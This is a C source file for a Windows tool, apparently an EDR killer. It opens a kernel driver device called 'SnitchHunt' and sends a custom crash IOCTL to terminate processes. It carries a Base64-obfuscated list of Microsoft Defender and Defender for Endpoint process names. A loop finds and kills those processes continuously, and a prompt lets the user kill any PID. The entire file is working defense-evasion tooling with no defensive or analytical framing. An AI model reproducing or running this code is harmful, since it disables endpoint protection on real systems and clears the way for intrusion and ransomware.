
#include <windows.h>
#include <stdio.h>
#include <DbgHelp.h>
#include <tchar.h>
#include <tlhelp32.h>
#include <wincrypt.h>

// Link with required libraries
#pragma comment (lib, "Crypt32.lib")
#pragma comment (lib, "Dbghelp.lib")



int stop_term_thread = 0;


// IOCTL base codes
#define SYSTEM_DRV 0x8000
#define IOCTL_BASE 0x800

// Helper macro to define our custom IOCTLs
#define CTL_CODE_HIDE(i) \
    CTL_CODE(SYSTEM_DRV, IOCTL_BASE + i, METHOD_BUFFERED, FILE_ANY_ACCESS)

// Define custom IOCTL to instruct driver to crash target process
#define IOCTL_CRASH CTL_CODE_HIDE(1)

#pragma warning (disable: 4996)

#define _CRT_SECURE_NO_WARNINGS


const char* edrNames[] = {
"U2Vuc2VJUi5leGU=",                       // SenseIR.exe
"U2VjSGVhbHRoVUkuZXhl",                  // SecHealthUI.exe
"TXBEZWZlbmRlckNvcmVTZXJ2aWNlLmV4ZQ==",  // MpDefenderCoreService.exe
"c21hcnRzY3JlZW4uZXhl",                  // smartscreen.exe
"TXNNcEVuZy5leGU=",                      // MsMpEng.exe
"U2VjdXJpdHlIZWFsdGhTZXJ2aWNlLmV4ZQ==",  // SecurityHealthService.exe
"U2VjdXJpdHlIZWFsdGhTeXN0cmF5LmV4ZQ==",  // SecurityHealthSystray.exe
"TXNTZW5zZS5leGU=",                      // MsSense.exe
"U2Vuc2VOZHIuZXhl",                      // SenseNdr.exe
"U2Vuc2VUVk0uZXhl",                      // SenseTVM.exe
"TmlzU3J2LmV4ZQ=="                       // NisSrv.exe
};


BOOL Terminate(HANDLE, DWORD);
DWORD FindProcessId(const char*);
char* base64_decode(const char*);
void killer_callback(HANDLE);


// Find PID of a process by its executable name
DWORD FindProcessId(const char* processName) {

    // Convert process name to wide char for comparison
    size_t wcharCount = mbstowcs(NULL, processName, 0) + 1;
    wchar_t* wprocessName = (wchar_t*)malloc(wcharCount * sizeof(wchar_t));
    if (!wprocessName) {
        return 0;
    }
    mbstowcs(wprocessName, processName, wcharCount);

    DWORD processId = 0;

    // Take a snapshot of all running processes
    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snapshot != INVALID_HANDLE_VALUE) {
        PROCESSENTRY32 processEntry;
        processEntry.dwSize = sizeof(PROCESSENTRY32);

        // Iterate through all processes to find a match
        if (Process32First(snapshot, &processEntry)) {
            do {
                if (wcscmp(processEntry.szExeFile, wprocessName) == 0) {
                    processId = processEntry.th32ProcessID;
                    break;
                }
            } while (Process32Next(snapshot, &processEntry));
        }
        CloseHandle(snapshot);
    }

    free(wprocessName);
    return processId;
}


// Decode Base64 encoded process name
char* base64_decode(const char* input) {
    DWORD decodedSize = 0;

    // First, get the size of decoded output
    if (!CryptStringToBinaryA(input, 0, CRYPT_STRING_BASE64, NULL, &decodedSize, NULL, NULL)) {
        fprintf(stderr, "Failed to calculate Base64 decoded size.\n");
        return NULL;
    }

    BYTE* decoded = (BYTE*)malloc(decodedSize);
    if (decoded == NULL) {
        fprintf(stderr, "Memory allocation failed.\n");
        return NULL;
    }

    // Decode Base64 string into raw bytes
    if (!CryptStringToBinaryA(input, 0, CRYPT_STRING_BASE64, decoded, &decodedSize, NULL, NULL)) {
        fprintf(stderr, "Failed to decode Base64.\n");
        free(decoded);
        return NULL;
    }

    // Convert raw bytes to C string
    char* decodedStr = (char*)malloc(decodedSize + 1);
    if (decodedStr == NULL) {
        fprintf(stderr, "Memory allocation failed.\n");
        free(decoded);
        return NULL;
    }
    memcpy(decodedStr, decoded, decodedSize);
    decodedStr[decodedSize] = '\0';

    free(decoded);
    return decodedStr;
}



BOOL Terminate(HANDLE hDevice, DWORD pid) {
    DWORD bytesReturned;
    BOOL result = DeviceIoControl(
        hDevice,
        IOCTL_CRASH,
        &pid,
        sizeof(pid),
        NULL,
        0,
        &bytesReturned,
        NULL);
    return result;
}


void killer_callback(HANDLE hDevice) {
	int edrCount = sizeof(edrNames) / sizeof(edrNames[0]);

    while (!stop_term_thread) {
        for (size_t i = 0; i < edrCount; i++) {
            char* decodedName = base64_decode(edrNames[i]);
            if (decodedName) {
                DWORD pid = FindProcessId(decodedName);
                if (pid != 0) {
                    printf("Found EDR process: %s with PID %lu\n", decodedName, pid);
                    DWORD bytesReturned;
					BOOL result = Terminate(hDevice, pid);
                    if (result) {
                        printf("Sent crash command to process %s (PID %lu)\n", decodedName, pid);
                    }
                    else {
                        fprintf(stderr, "Failed to send crash command. Error: %lu\n", GetLastError());
                    }
                }
                free(decodedName);
            }
        }
    }
}



int main(int argc, char* argv[])
{

    HANDLE hDevice = CreateFileA(
        "\\\\.\\SnitchHunt",                // Device name
        GENERIC_READ | GENERIC_WRITE,      // Desired access
        0,                                  // Share mode
        NULL,                               // Security attributes
        OPEN_EXISTING,                      // Creation disposition
        FILE_ATTRIBUTE_NORMAL,              // Flags and attributes
		NULL);                              // Template file

    const size_t edrCount = sizeof(edrNames) / sizeof(edrNames[0]);
    HANDLE hTerminateThread;


    while (1) {
		char input[256];

		printf("> ");

		fgets(input, sizeof(input), stdin);
        if (strncmp(input, "terminate", 9) == 0) {
			stop_term_thread = 0;
            hTerminateThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)killer_callback, hDevice, 0, NULL);
            if (hTerminateThread == NULL) {
                fprintf(stderr, "Failed to create termination thread. Error: %lu\n", GetLastError());
                return 1;
			}
        }
        else if (strncmp(input, "exit", 4) == 0) {
            printf("Exiting...\n");
            break;
        }
        else if (strncmp(input, "stopterm", 8) == 0) {
            printf("Stopping termination...\n");
			stop_term_thread = 1;            
        }
        else if (strncmp(input, "kill", 4) == 0) {
            DWORD pid = atoi(input + 5);
            if (pid == 0) {
                printf("Invalid PID.\n");
                continue;
            }
            BOOL result = Terminate(hDevice, pid);
            if (result) {
                printf("Sent crash command to process with PID %lu\n", pid);
            }
            else {
                printf("Failed to send crash command. Error: %lu\n", GetLastError());
            }
		}
        else if (strncmp(input, "help", 4) == 0) {
			printf("Help menu:\n");
			printf(" - terminate        - Start killing EDR processes\n");
			printf(" - kill <PID>       - Kill a specific process by PID\n");
			printf(" - exit             - Exit the program\n");
			printf(" - stopterm         - Stop killing EDR processes\n");
			printf(" - help             - Show this help menu\n");
        }
        else {
            printf("Unknown command. Available commands: kill, exit\n");
		}
    }



	return 0;
}